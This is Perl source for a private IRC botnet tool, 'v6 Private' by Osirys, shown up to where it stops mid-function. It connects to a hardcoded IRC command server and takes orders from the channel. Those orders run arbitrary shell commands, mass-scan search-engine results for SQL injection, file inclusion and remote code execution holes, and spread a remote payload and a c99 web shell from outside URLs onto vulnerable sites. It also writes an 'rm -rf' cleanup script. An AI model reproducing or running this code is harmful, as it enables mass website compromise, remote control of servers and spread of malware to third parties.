
  #####################################################################################
  ##                                                                                 ##
  ##                                                                   15/06/2008    ##
  ##  Author  : Osirys                                                               ##
  ##  WebSite :                                                                      ##
  ##  Contact : osirys[at]live[dot]it                                                ##
  ##  Italian Coder                                                                  ##
  ##                                                                                 ##
  ##  ## IMPORTANT ##                                                                ##
  ##   # ONLY FOR EDUCATIONAL PURPOSE. THE AUTHOR IS NOT RESPONSABLE OF ANY          ##
  ##   # IMPROPERLY USE OF THIS TOOL. USE IT AT YOUR OWN RISK !!                     ##
  ##  ##                                                                             ##
  ##                                                                                 ##
  ##  Release: v6 Private                                                            ##
  ##      After the success of the v5, I decided to code a new release :-)           ##
  ##      This is a private script. If you have it, keep it priv8 !!!                ##
  ##                                                                                 ##
  ##  Features:                                                                      ##
  ##    [+]Sql Injection Scanner (Fixed a bug which release v5 was affected)         ##
  ##    [+]Remote File Inclusion Scanner                                             ##
  ##    [+]Local File Inclusion Scanner                                              ##
  ##    [+]Remote Code Execution Scanner                                             ##
  ##    [+]Mass Scan, Google,AlltheWeb,Yahoo, Msn domains:                           ##
  ##      .at/.com.au/.com.br/.ca/.ch/.cn/.de/.dk/.es/.fr/.it/.co.jp/.com.mx/.co.uk  ##
  ##    [+]Integrated Shell, so you can execute commands on the server               ##
  ##    [+]Security Mode to protect "dangerous" functions                            ##
  ##    [+]Spread Mode, to activate or disable Spread Function                       ##
  ##    [+]Single Spread Mode, to spread on RFI vulnerable sites                     ##
  ##    [+]Bypass Engines ON: Google, Yahoo                                          ##
  ##    !: To "bypass" these engines, the Scanner just looks for websites on other   ##
  ##    engines that use the same bots than the main ones                            ##
  ##                                                                                 ##
  #####################################################################################


use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

#######################################################
## CONFIGURATION                                     //
#######################################################

$auth = "Osirys";
$authmail = "osirys\@live.it";
my $id    = "http://afe.la/id.txt?";               #Your RFI Response
my $shell = "http://web4cc.t35.com/c99.txt?";                                  #Shell printed on the Vulnerable Site
my $ircd  = "afro.hitmanslife.net";                                                  #Irc-Server
my $port  = "6667";                                                           #Irc-Server Port
my $chan1 = "#achap";                                                          #Chan for Scan
my $chan2 = "#achap";                                                          #Results will be printed here too
my $nick  = "ashraf|".int(rand(99))."[xx]";                                                      #Nick
my @admins = ("b");
my $sqlpidpr0c = 1; # This is the number of sites that the bot will test in the same time. For an accurated scann, it's reccomended to set a low number(1) 
# (Expecially if you are scanning on 0day bugs), so a lot of presunted vulnerable sites. Unless you will see the bot exiting by an excess flood!
# Instead, if you are scaning on old bugs, so not many results, you can put a higher number, so more speed.
my $rfipidpr0c = 50;

### USEFULL OPTIONS ( 0 => OFF  ;  1 => ON )

my $spread = "http://afe.la/b?";

my $spreadACT   = 0; #0 ->disabled, 1 ->enabled
my $securityACT = 0; #0 ->disabled, 1 ->enabled
&cheek();
my $killpwd   = "lol"; #Password to Kill the Bot
my $chidpwd   = "lol"; #Password to change the RFI Response
my $cmdpwd    = "achap123"; #Password to execute commands on the server
my $secpwd    = "achap123"; #Passowrd to enable/disable the Security Mode
my $spreadpwd = "achap123"; #Passowrd to enable/disable the Spread Mode

my $badspreadpwd != $spreadpwd;
my $badkillpwd   != $killpwd;
my $badidpwd     != $chidpwd;
my $badcmdpwd    != $cmdpwd;
my $badsecpwd    != $secpwd;

#######################################################
## END OF CONFIGURATION                              //
#######################################################

$k= 0;
print q{
------------------------------------------------
         __   ___
   __ __/ /  / __| __ __ _ _ _  _ _  ___ _ _
   \ V / _ \ \__ \/ _/ _` | ' \| ' \/ -_) '_|
    \_/\___/ |___/\__\__,_|_||_|_||_\___|_|

------------------------------------------------
[+] Coded by Osirys
[+] Contact: osirys[at]live[it]
[+] Keep it private !
[+] *New release, more fun ;)
[+] *Updated to: 18/06/2008

};

open($f1le, ">", "rm.txt");
print $f1le "\#!/usr/bin/perl\n";
print $f1le "exec(\"rm -rf \*siti\* && rm rm.txt\")\;\n";
close $f1le;

@help = (
"15,1[!] 9,1!response 15,1 > 11,1Test if the RFI Response is working",
"15,1[*] 9,1!chid <new rfi-id> 15,1 > 11,1Change the RFI-Response",
"15,1[*] 9,1!killme 15,1 > 11,1KILL The Bot",
"15,1[!] 9,1!milw0rm rss 15,1 > 11,1Get the last Milw0rm bugs",
"15,1[!] 9,1!new rfi bugs 15,1 > 11,1Get the last 10 RFI bugs",
"15,1[!] 9,1!new lfi bugs 15,1 > 11,1Get the last 10 LFI bugs",
"15,1[!] 9,1!new sql bugs 15,1 > 11,1Get the last 10 SQL Injection bugs",
"15,1[!] 9,1!new rce bugs 15,1 > 11,1Get the last 10 RCE bugs",
"15,1[!] 9,1!rfi <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the RFI Scanner",
"15,1[!] 9,1!lfi <bug> <dork> 15,1 > 11,1Start the LFI Scanner",
"15,1[!] 9,1!sql <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the SQL Injection Scanner",
"15,1[!] 9,1!rce <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the RCE Scanner",
"15,1[!] 9,1!mass[rfi/lfi/sql/rce] <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the Mass Scan",
"15,1[*] 9,1!cmd <bashline> 15,1 > 11,1Gives command on the Bot's shell. Ex: (!cmd id) (!cmd uname -a)",
"15,1[*] 9,1!sspread -s <RFI_Vuln_site> 15,1 > 11,1To spread on a vulnerable host. Ex: (!spread -s www.h.com/a.php?bug=)",
"15,1[*] 9,1!admin add/remove <nickname> 15,1 > 11,1To add/remove a nickname to/from the admin list",
"15,1[*] 9,1/msg $nick !Sec ON/OFF -p <pwd> 15,1 > 11,1To enable or disable Security Mode",
"15,1[*] 9,1/msg $nick !Spread ON/OFF -p <pwd> 15,1 > 11,1To enable or disable Spread Mode",
"15,1[!] 9,1!info 15,1 > 11,1Get infos about the Bot",
"4,1[!!] For commands with the15,1 [*]4,1 you must be an Admin of the v6"
);

my $sys = `uname -a`;
my $up = `uptime`;

if ($spreadACT == 0) {
    $t5 = "OFF";
}
elsif ($spreadACT == 1) {
    $t5 = "ON";
}

if ($securityACT == 0) {
    $y5 = "OFF";
}
elsif ($securityACT == 1) {
    $y5 = "ON";
}

if (fork() == 0) {
    &irc($ircd, $port, $chan1, $chan2, $nick);
}
else {
    exit(0);
}

sub irc() {
    my ($ircd, $port, $chan1, $chan2, $nick) = @_;
    $c0n = IO::Socket::INET->new(PeerAddr => "$ircd",PeerPort => "$port",Proto => "tcp") || die "Can not connect on server!\n";
    $c0n->autoflush(1);
    print $c0n "NICK $nick\n";
    print $c0n "USER soldier 8 *  : Osirys\n";
    print $c0n "JOIN $chan1\n";
    writ1("4,1_/9,1 V6-Private 11,1ON 7,1_>");
    writ1("4,1© Coded by Osirys");
    while ($line = <$c0n>) {

        $k++;
        my @word = split /\:/, $line;
        my @words = split /\!/, $word[1];
        my $sys = `uname -a`;
        my $up = `uptime`;
        @info = (
         "9,1[i] 15,1Release : 11,1v6 -Private IrcBot",
         "9,1[i] 15,1Author  : 11,1$auth - Italian coder",
         "9,1[i] 15,1Contact : 11,1$authmail",
         "9,1[i] 15,1Uname -a: 11,1$sys",
         "9,1[i] 15,1Uptime  : 11,1$up",
         "9,1[i] 15,1Spread Mode: 11,1$t5",
         "9,1[i] 15,1Security Mode: 11,1$y5"
        );

        if ($spreadACT == 0) {
            $t5 = "OFF";
        }
        elsif ($spreadACT == 1) {
            $t5 = "ON";
        }

        if ($securityACT == 0) {
            $y5 = "OFF";
        }
        elsif ($securityACT == 1) {
            $y5 = "ON";
        }


        if ($line =~ /^PING \:(.*)/) {
            print $c0n "PONG :$1";
        }
        if ($line =~ /001/) {
            print $c0n "JOIN $chan1\n";
        }
        if ($line =~ /PRIVMSG $chan1 :!help/) {
            &help();
        }
        if ($line =~ /PRIVMSG $chan1 :!info/){
            &info();
        }
        if ($line =~ /PRIVMSG $chan1 :!response/) {
            &response();
        }
        if ($line =~ /PRIVMSG $chan1 :!milw0rm rss/) {
            &milw0rm();
        }
        if ($line =~ /PRIVMSG $chan1 :!new ([a-z]{3}) bug/) {
            &bug_update($1);
        }
        if (($line =~ /PRIVMSG $chan1 :!chid\s+(.*)/)&&($securityACT == 0)) {
            &chid($words[0],$1);
        }
        if (($line =~ /PRIVMSG $nick :!chid\s+(.*) -p $chidpwd/)&&($securityACT == 1)) {
            &chid($words[0],$1,"a");
        }
        elsif (($line =~ /PRIVMSG $nick :!chid\s+(.*) -p $badidpwd/)&&($securityACT == 1)) {
            pm($words[0],"15,1[-] 9,1Error Changing the RFI-Response (bad Password)!");
        }
        if (($line =~ /PRIVMSG $chan1 :!killme/)&&($securityACT == 0)) {
            &killme($words[0]);
        }
        if (($line =~ /PRIVMSG $nick :!killme -p $killpwd/)&&($securityACT == 1)) {
            &killme($words[0],"a");
        }
        elsif (($line =~ /PRIVMSG $nick :!killme -p $badkillpwd/)&&($securityACT == 1)) {
            pm($words[0],"15,1[-] 12,4Error Killing the Bot (Null or bad Password) !");
        }
        if (($line =~ /PRIVMSG $chan1 :!admin (add|remove)\s+(.*)/)&&($securityACT == 0)) {
            &ch_admin($1,$words[0],$2);
        }
        if (($line =~ /PRIVMSG $nick :!admin (add|remove)\s+(.*) -p $chadminpwd/)&&($securityACT == 1)) {
            &ch_admin($1,$words[0],$2,"a");
        }
        elsif (($line =~ /PRIVMSG $nick :!admin (add|remove)\s+(.*) -p $badchadminpwd/)&&($securityACT == 1)) {
            pm($words[0],"15,1[-] 12,4Error changing the Admin list (Null or bad Password) !");
        }
        if (($line =~ /PRIVMSG $chan1 :!cmd\s+(.*)/)&&($securityACT == 0)) {
            &cmd($words[0],$1);
        }
        if (($line =~ /PRIVMSG $nick :!cmd\s+(.*) -p $cmdpwd/)&&($securityACT == 1)) {
            &cmd($words[0],$1,"a");
        }
        elsif (($line =~ /PRIVMSG $nick :!cmd\s+(.*) -p $badcmdpwd/)&&($securityACT == 1)) {
            pm($words[0],"15,1[-] 12,4Error using the shell (Null or bad Password) !");
        }
        if ($line =~ /PRIVMSG $nick :!Sec\s+(.*) -p $secpwd/) {
            &sec($words[0],$1);
        }
        elsif ($line =~ /PRIVMSG $nick :!Sec\s+(.*) -p $badsecpwd/) {
            pm($words[0],"15,1[-] 12,4Error changing the Security Mode (Null or bad Password) !");
        }
        if (($line =~ /PRIVMSG $chan1 :!Spread\s+(.*)/)&&($securityACT == 0)) {
            &spread($words[0],$1);
        }
        if (($line =~ /PRIVMSG $nick :!Spread\s+(.*) -p $spreadpwd/)&&($securityACT == 1)) {
            &spread($words[0],$1,"a");
        }
        elsif (($line =~ /PRIVMSG $nick :!Spread\s+(.*) -p $badspreadpwd/)&&($securityACT == 1)) {
            pm($words[0],"15,1[-] 12,4Error changing the Spread Mode (Null or bad Password) !");
        }
        if ($line =~ /PRIVMSG $chan1 :!sspread -s\s+(.*)/) {
            &sspread($words[0],$1);
        }
        if (($line =~ /PRIVMSG $chan1 :!rfi\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 1)&&(fork() == 0)) {
            &rfi_cheek($1,$2,$3,"s",$words[0]);
        }
        if (($line =~ /PRIVMSG $chan1 :!rfi\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 0)&&(fork() == 0)) {
            &rfi_cheek($1,$2,$3,"j");
        }
        if (($line =~ /PRIVMSG $chan1 :!lfi\s+(.*?)\s+(.*)/)&&($securityACT == 1)&&(fork() == 0)) {
            &lfi_cheek($1,$2,$3,"s",$words[0]);
        }
        if (($line =~ /PRIVMSG $chan1 :!lfi\s+(.*?)\s+(.*)/)&&($securityACT == 0)&&(fork() == 0)) {
            &lfi_cheek($1,$2,"j");
        }
        if (($line =~ /PRIVMSG $chan1 :!sql\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 1)&&(fork() == 0)) {
            &sql_cheek($1,$2,$3,"s",$words[0]);
        }
        if (($line =~ /PRIVMSG $chan1 :!sql\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 0)&&(fork() == 0)) {
            &sql_cheek($1,$2,$3,"j");
        }
        if (($line =~ /PRIVMSG $chan1 :!rce\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 1)&&(fork() == 0)) {
            &rce_cheek($1,$2,$3,"s",$words[0]);
        }
        if (($line =~ /PRIVMSG $chan1 :!rce\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 0)&&(fork() == 0)) {
            &rce_cheek($1,$2,$3,"j");
        }
        if (($line =~ /PRIVMSG $chan1 :!mass\[(rfi|lfi|sql|rce)\]\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 1)&&(fork() == 0)) {
            &mass_cheek($1,$2,$3,$4,"s",$words[0]);
        }
        if (($line =~ /PRIVMSG $chan1 :!mass\[(rfi|lfi|sql|rce)\]\s+(.*?)\s+(.*)\s+-p(.+[0-9])/)&&($securityACT == 0)&&(fork() == 0)) {
            &mass_cheek($1,$2,$3,$4,"j");
        }
    }
}

sub help() {
    if ($securityACT == 0) {
        @help;
        foreach my $e(@help){
            writ1("$e");
        }
    }
    elsif ($securityACT == 1) {
        @help;
        $help[1]  = "15,1[*] 9,1/msg $nick !chid <new rfi-id> -p <pwd> 15,1 > 11,1Change the RFI-Response";
        $help[2]  = "15,1[*] 9,1/msg $nick !killme 15,1 > -p <pwd> 11,1KILL The Bot";
        $help[8]  = "15,1[*] 9,1!rfi <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the RFI Scanner";
        $help[9]  = "15,1[*] 9,1!lfi <bug> <dork> 15,1 > 11,1Start the LFI Scanner";
        $help[10] = "15,1[*] 9,1!sql <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the SQL Injection Scanner";
        $help[11] = "15,1[*] 9,1!rce <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the RCE Scanner";
        $help[12] = "15,1[*] 9,1!mass[rfi/lfi/sql/rce] <bug> <dork> -p <sites/proc> 15,1 > 11,1Start the Mass Scan";
        $help[13] = "15,1[*] 9,1/msg $nick !cmd <bashline> -p <pwd> 15,1 > 11,1Gives command on the Bot's shell. Ex: (!cmd id) (!cmd uname -a)";
        $help[14] = "15,1[*] 9,1/msg $nick !spread -s <RFI_Vuln_site> -p <pwd> 15,1 > 11,1To spread on a vulnerable host. Ex: (!spread -s www.h.com/a.php?bug=)";
        $help[15] = "15,1[*] 9,1/msg $nick !admin add/remove <nickname> -p <pwd> 15,1 > 11,1To add/remove a nickname to/from the admin list";
        $help[16] = "15,1[*] 9,1/msg $nick !Sec ON/OFF -p <pwd> 15,1 > 11,1To enable or disable Security Mode";
        $help[17] = "15,1[*] 9,1/msg $nick !Spread ON/OFF -p <pwd> 15,1 > 11,1To enable or disable Spread Mode";
        $#help = 18;
        writ1("4,1[!] Security Mode is ON. To use *commands you have to be an admin of the v6");
        foreach my $e(@help){
            writ1("$e");
        }
    }
}

sub info() {
    @info;
    foreach my $n(@info) {
        writ1("$n");
    }
}

sub response() {
    my $re = query($id);
    if ($re =~ /Osirys/) {
        writ1("15,1[+] 12,9RFI Response is working !");
    }
    else {
        writ1("15,1[-] 12,4RFI Response is NOT working !");
    }
}

sub milw0rm() {
    my $mlink = ("http://www.milw0rm.com/rss.php");
    my $re = query($mlink);
    my $l = -1;
    while ($re =~ m/<title>(.+?)<\/title>/g){
        my $title = $1;  $title =~ s/\&lt\;/</g;
        if ($title !~ /milw0rm/) {
            push(@ttot,$title);
        }
    }
    while ($re =~ m/<link>(.+?)<\/link>/g) {
        my $link = $1;
        if ($link !~ /http:\/\/milw0rm.com\//) {
            push(@ltot,$link);
        }
    }
    writ1("15,1[+] 4,1Last Milw0rm bugs:");
    foreach my $n(@ttot){
        $l++;
        writ1("15,1[+] 9,1$n4,1 -11,1 $ltot[$l]");
    }
}

sub bug_update() {
    my $kind = $_[0];
    if ($kind =~ /rfi/) {
        my @re = query("nostrosito"); #Put here a link in .txt with a list of bugs
        writ1("15,1[+] 9,1Last 10 RFI bugs:");
        foreach my $n(@re) {
            writ1(" 9,1$n ");
        }
    }
    elsif ($kind =~ /lfi/) {
        my @re = query("nostrosito"); #Put here a link in .txt with a list of bugs
        writ1("15,1[+] 9,1Last 10 LFI bugs:");
        foreach my $n(@re) {
            writ1(" 9,1$n ");
        }
    }
    elsif ($kind =~ /sql/) {
        my @re = query("nostrosito"); #Put here a link in .txt with a list of bugs
        writ1("15,1[+] 9,1Last 10 SQL-INJ bugs:");
        foreach my $n(@re) {
            writ1(" 9,1$n ");
        }
    }
    elsif ($kind =~ /rce/) {
        my @re = query("nostrosito"); #Put here a link in .txt with a list of bugs
        writ1("15,1[+] 9,1Last 10 RCE bugs:");
        foreach my $n (@re) {
            writ1(" 9,1$n ");
        }
    }
}

sub chid() {
    my $nick = $_[0];
    my $newid = $_[1];
    my $reply = $_[2];
    my $val = admin($nick);
    if ($val == 1) {
        $id = $newid;
        if ($reply =~ /a/) {
            pm($nick, "15,1[+] 9,1New RFI Response: $id");
        }
        writ1("15,1[+] 9,1RFI Response changed !");
        writ1("15,1[+] 9,1New RFI Response: $id");
    }
    else {
        pm($nick,"4,1[!] You are not authorized to execute this command!");
    }
}

sub killme() {
    my $nick = $_[0];
    my $reply = $_[1];
    my $val = admin($nick);
    if ($reply =~ /a/) {
        if ($val == 1) {
            pm($nick, "15,1[!] 12,4Bye Bye !");
            writ1("15,1[!] 12,4Bye Bye !");
            print $c0n "QUIT";
            exec("perl rm.txt && pkill perl \n");
        }
    }
    else {
        if ($val == 1) {
            writ1("15,1[!] 12,4Bye Bye !");
            print $c0n "QUIT";
            exec("perl rm.txt && pkill perl \n"); 
        }
        else {
            writ1("4,1[!] You are not authorized to execute this command!");
        }
    }
}

sub ch_admin() {
    @admins;
    my $command = $_[0];
    my $nick = $_[1];
    my $nick2 = $_[2];
    my $mode = $_[3];
    my $val = admin($nick);
    if ($val == 1) {
        if ($command =~ /add/) {
            if ($mode =~ /a/) {
                pm($nick,"15,1[+] 12,9$nick2 added in the Admin List!!");
            }
            push(@admins, $nick2);
            writ1("15,1[+] 12,9$nick added $nick2 in the Admin List!!");
        }
        elsif ($command =~ /remove/) {
            $t_adm = scalar(@admins);
            foreach my $a(@admins){
                if ($a eq $nick2) {
                    $l = $t_adm +1;
                    $a = $a[$l];
                    $#admins = $t_adm;
                }
            }
            if ($mode =~ /a/) {
                pm($nick,"15,1[+] 12,9$nick2 removed from the Admin List!!");
            }
            writ1("15,1[+] 12,9$nick removed $nick2 from the Admin List!!");
        }
    }
    else {
        pm($nick,"4,1[!] You are not authorized to execute this command!");
    }
}

sub cmd() {
    my $nick = $_[0];
    my $cmd = $_[1];
    my $reply = $_[2];
    my $val = admin($nick);
    if ($val == 1) {
        if ($reply =~ /a/) {
            if ($cmd =~ /cd (.*)/) {
                chdir($1) || pm($nick,"Can't change dir");
                #return;
            }
            my @output = `$cmd`;
            my $count = 0;
            foreach my $out(@output) {
                $count++;
                if ($count == 10) {
                    sleep(3);
                    $count = 0;
                }
                pm($nick,"15,1[+] 7,1$out");
            }
        }
        else {
            if ($cmd =~ /cd (.*)/) {
                chdir($1) || writ1("Can't change dir");
                #return;
            }
            my @output = `$cmd`;
            my $count = 0;
            foreach my $out(@output) {
                $count++;
                if ($count == 10) {
                    sleep(3);
                    $count = 0;
                }
                writ1("15,1[+] 7,1$out ");
            }
        }
    }
    else {
        pm($nick,"4,1[!] You are not authorized to execute this command!");
    }
}

sub sec() {
    my $nick = $_[0];
    my $mode = $_[1];
    my $val = admin($nick);
    if ($val == 1) {
        if ($mode =~ /ON/) {
            $securityACT = 1;
            sleep(2);
            pm($nick,"15,1[+] 12,9Security Mode Activated !!");
            writ1("15,1[+] 12,9Security Mode Activated !!");
        }
        elsif ($mode =~ /OFF/) {
            $securityACT = 0;
            sleep(2);
            pm($nick,"15,1[+] 12,4Security Mode Disabled !!");
            writ1("15,1[+] 12,4Security Mode Disabled !!");
        }
    }
}

sub spread() {
    my $nick = $_[0];
    my $mode = $_[1];
    my $reply = $_[2];
    my $val = admin($nick);
    if ($val == 1) {
        if ($mode =~ /ON/) {
            $spreadACT = 1;
            sleep(2);
            if ($reply =~ /a/) {
                pm($nick, "15,1[+] 12,9Spread Mode Activated !!");
            }
            writ1("15,1[+] 12,9Spread Mode Activated !!");
        }
        elsif ($mode =~ /OFF/) {
            $spreadACT = 0;
            sleep(2);
            if ($reply =~ /a/) {
                pm($nick, "15,1[+] 12,4Spread Mode Disabled !!");
            }
            writ1("15,1[+] 12,4Spread Mode Disabled !!");
        }
    }
    else {
        pm($nick,"4,1[!] You are not authorized to execute this command!");
    }
}

sub sspread() {
    my $nick = $_[0];
    my $host = $_[1];
    my $val = admin($nick);
    if ($val == 1) {
        my $host =~ s/http:\/\///;
        writ1("15,1[+] 9,1Trying to spread on $host ..");
        my $tspread = "http://".$host.$spread."?";
        &query($tspread);
    }
    else {
        writ1("4,1[!] You are not authorized to execute this command!");
    }
}

sub rfi_cheek() {
    my $bug = $_[0];
    my $dork = $_[1];
    my $rfipid = $_[2];
    my $chek = $_[3];
    my $nick = $_[4];
    if ($chek =~ /j/) {
        &rfi_scan($bug, $dork, $rfipid);
    }
    elsif ($chek =~ /s/) {
        my $val = admin($nick);
        if ($val == 1) {
            &rfi_scan($bug, $dork, $rfipid);
        }
        else {
            writ1("4,1[!] You are not authorized to execute this command!");
        }
    }
}

sub rfi_scan() {
    my $bug = $_[0];
    my $dork = $_[1];
    my $rfipid = $_[2];
    writ1("4,1[*] 9,1RFI Scan started -> $rfipid sites/process");
    writ1("9,1[+] Bug: $bug");
    $d0rk = clean($dork);
    writ1("4,1[+] Dork: $d0rk");
    my $a    = $k . "a";
    my $n4me = $a . "siti.txt";
    find($d0rk, $n4me);
    rfi($bug, $n4me, $d0rk, $rfipid);
    writ1("4,1[-] RFI Scan finished 9,1 >15,1 $d0rk");
    writ1("11,1[©] # Coded by Osirys");
    exit(0);
}

sub lfi_cheek() {
    my $bug = $_[0];
    my $dork = $_[1];
    my $chek = $_[2];
    my $nick = $_[3];
    if ($chek =~ /j/) {
        &lfi_scan($bug, $dork);
    }
    elsif ($chek =~ /s/) {
        my $val = admin($nick);
        if ($val == 1) {
            &lfi_scan($bug, $dork);
        }
        else {
            writ1("4,1[!] You are not authorized to execute this command!");
        }
    }
}

sub lfi_scan() {
    my $bug = $_[0];
    my $dork = $_[1];
    writ1("4,1[*] 7,1LFI Scan started ");
    writ1("9,1[+] Bug: $bug");
    $d0rk = clean($dork);
    writ1("4,1[+] Dork: $d0rk");
    my $b    = $k . "b";
    my $n4me = $b . "siti.txt";
    find($d0rk, $n4me);
    lfi($bug, $n4me, $d0rk);
    writ1("4,1[-] LFI Scan finished 9,1 >15,1 $d0rk");
    writ1("11,1[©] # Coded by Osirys");
    exit(0);
}

sub sql_cheek() {
    my $bug = $_[0];
    my $dork = $_[1];
    my $sqlpid = $_[2];
    my $chek = $_[3];
    my $nick = $_[4];
    if ($chek =~ /j/) {
        &sql_scan($bug, $dork, $sqlpid);
    }
    elsif ($chek =~ /s/) {
        my $val = admin($nick);
        if ($val == 1) {
            &sql_scan($bug, $dork, $sqlpid);
        }
        else {
            writ1("4,1[!] You are not authorized to execute this command!");
        }
    }
}

sub sql_scan() {
    my $bug = $_[0];
    my $dork = $_[1];
    my $sqlpid = $_[2];
    writ1("4,1[*] 15,1SQL Inj Scan started -> $sqlpid sites/process");
    writ1("9,1[+] Bug: $bug");
    $d0rk = clean($dork);
    writ1("4,1[+] Dork: $d0rk");
    my $c    = $k . "c";
    my $n4me = $c . "siti.txt";
    find($d0rk, $n4me);
    sql($bug, $n4me, $d0rk, $sqlpid);
    writ1("4,1[-] SQL Scan finished 9,1 >15,1 $d0rk");
    writ1("11,1[©] # Coded by Osirys");
    exit(0);
}

sub rce_cheek() {
    my $bug = $_[0];
    my $dork = $_[1];
    my $rcepid = $_[2];
    my $chek = $_[3];
    my $nick = $_[4];
    if ($chek =~ /j/) {
        &rce_scan($bug, $dork, $rcepid);
    }
    elsif ($chek =~ /s/) {
        my $val = admin($nick);
        if ($val == 1) {
            &rce_scan($bug, $dork, $rcepid);
        }
        else {
            writ1("4,1[!] You are not authorized to execute this command!");
        }
    }
}

sub rce_scan() {
    my $bug = $_[0];
    my $dork = $_[1];
    my $rcepid = $_[2];
    writ1("4,1[*] 0,12RCE Scan started -> $sqlpid sites/process");
    writ1("9,1[+] Bug: $bug");
    $d0rk = clean($dork);
    writ1("4,1[+] Dork: $d0rk");
    my $c    = $k . "c";
    my $n4me = $c . "siti.txt";
    find($d0rk, $n4me);
    rce($bug, $n4me, $d0rk, $sqlpid);
    writ1("4,1[-] RCE Scan finished 9,1 >15,1 $d0rk");
    writ1("11,1[©] # Coded by Osirys");
    exit(0);
}

sub mass_cheek() {
    my $kind = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $mpid = $_[3];
    my $chek = $_[4];
    my $nick = $_[5];
    if ($chek =~ /j/) {
        &mass_scan($kind, $bug, $dork, $mpid);
    }
    elsif ($chek =~ /s/) {
        my $val = admin($nick);
        if ($val == 1) {
            &mass_scan($kind, $bug, $dork, $mpid);
        }
        else {
            writ1("4,1[!] You are not authorized to execute this command!");
        }
    }
}

sub mass_scan() {
    my $kind = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $mpid = $_[3];
    my @engine;
    my $c = $k."MASS";
    my $n4me = $c."siti.txt";
    my $g = $k."G";   my $a = $k."A";   my $y = $k."Y";   my $m = $k."M";
    my $gname = $g."siti.txt";
    my $aname = $a."siti.txt";
    my $yname = $y."siti.txt";
    my $mname = $m."siti.txt";
    my $gtest = ("www.google.com/search?q=hi&hl=en&start=10&sa=N");
    my $ytest = ("http://it.search.yahoo.com/search?p=ciao&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vd=all&vst=0&vf=all&vm=r&fl=0&fr=yfp-t-501&pstart=1&b=0");
    my $re = query1($gtest);  my $re2 = query($ytest);
    if (($re !~ /Google Home/)&&($re2 !~ /<p>1 - 100 di circa/)) {
        writ1("4,1[*] 12,1MASS[9,1$kind12,1] SCAN STARTED ON ALLTHEWEB/MSN (Google&Yahoo banned) -> $mpid sites/process");
        writ1("9,1[+] Bug: $bug");
        writ1("4,1[+] Dork: $dork");
        $engine[0] = fork();
        if ($engine[0] == 0) {
            &M_Super($dork, $mname);
            exit(0);
        }
        $engine[1] = fork();
        if ($engine[1] == 0) {
            &A_Super($dork, $aname);
            exit(0);
        }
        foreach my $e(@engine){
            waitpid($e,0);
        }
        open($file, ">>", $n4me);  open(Alltheweb,"<",$aname);  open(Msn,"<",$mname);
        foreach my $e(<Alltheweb>){
            print $file "$e\n";
        }
        foreach my $e(<Msn>){
            print $file "$e\n";
        }
        close(Alltheweb);  close(Msn);  close($file);
        remove($aname,$mname);
    }
    elsif (($re =~ /Google Home/)&&($re2 !~ /<p>1 - 100 di circa/)) {
        writ1("4,1[*] 12,1MASS[9,1$kind12,1] SCAN STARTED ON GOOGLE/ALLTHEWEB/MSN (Yahoo banned) -> $mpid sites/process");
        writ1("9,1[+] Bug: $bug");
        writ1("4,1[+] Dork: $dork");
        $engine[0] = fork();
        if ($engine[0] == 0) {
            &G_Super($dork, $gname);
            exit(0);
        }
        $engine[1] = fork();
        if ($engine[1] == 0) {
            &M_Super($dork, $mname);
            exit(0);
        }
        $engine[2] = fork();
        if ($engine[2] == 0) {
            &A_Super($dork, $aname);
            exit(0);
        }
        foreach my $e(@engine){
            waitpid($e,0);
        }
        open($file, ">>", $n4me);  open(Google,"<",$gname);  open(Alltheweb,"<",$aname);  open(Msn,"<",$mname);
        foreach my $e(<Google>){
            print $file "$e\n";
        }
        foreach my $e(<Alltheweb>){
            print $file "$e\n";
        }
        foreach my $e(<Msn>){
            print $file "$e\n";
        }
        close(Alltheweb);  close(Google);  close(Msn);  close($file);
        remove($gname,$aname,$mname);
    }
    elsif (($re !~ /Google Home/)&&($re2 =~ /<p>1 - 100 di circa/)) {
        writ1("4,1[*] 12,1MASS[9,1$kind12,1] SCAN STARTED ON ALLTHEWEB/YAHOO/MSN (Google banned) -> $mpid sites/process");
        writ1("9,1[+] Bug: $bug");
        writ1("4,1[+] Dork: $dork");
        $engine[0] = fork();
        if ($engine[0] == 0) {
            &Y_Super($dork, $yname);
            exit(0);
        }
        $engine[1] = fork();
        if ($engine[1] == 0) {
            &M_Super($dork, $mname);
            exit(0);
        }
        $engine[2] = fork();
        if ($engine[2] == 0) {
            &A_Super($dork, $aname);
            exit(0);
        }
        foreach my $e(@engine){
            waitpid($e,0);
        }
        open($file, ">>", $n4me);  open(Yahoo,"<",$yname);  open(Alltheweb,"<",$aname);  open(Msn,"<",$mname);
        foreach my $e(<Yahoo>){
            print $file "$e\n";
        }
        foreach my $e(<Alltheweb>){
            print $file "$e\n";
        }
        foreach my $e(<Msn>){
            print $file "$e\n";
        }
        close(Alltheweb);  close(Yahoo);  close(Msn);  close($file);
        remove($yname,$aname,$mname);
    }
    elsif (($re =~ /Google Home/)&&($re2 =~ /<p>1 - 100 di circa/)) {
        writ1("4,1[*] 12,1MASS[9,1$kind12,1] SCAN STARTED ON GOOGLE, ALLTHEWEB, YAHOO, MSN -> $mpid sites/process");
        writ1("9,1[+] Bug: $bug");
        writ1("4,1[+] Dork: $dork");
        $engine[0] = fork();
        if ($engine[0] == 0) {
            &G_Super($dork, $gname);
            exit(0);
        }
        $engine[1] = fork();
        if ($engine[1] == 0) {
            &Y_Super($dork, $yname);
            exit(0);
        }
        $engine[2] = fork();
        if ($engine[2] == 0) {
            &M_Super($dork, $mname);
            exit(0);
        }
        $engine[3] = fork();
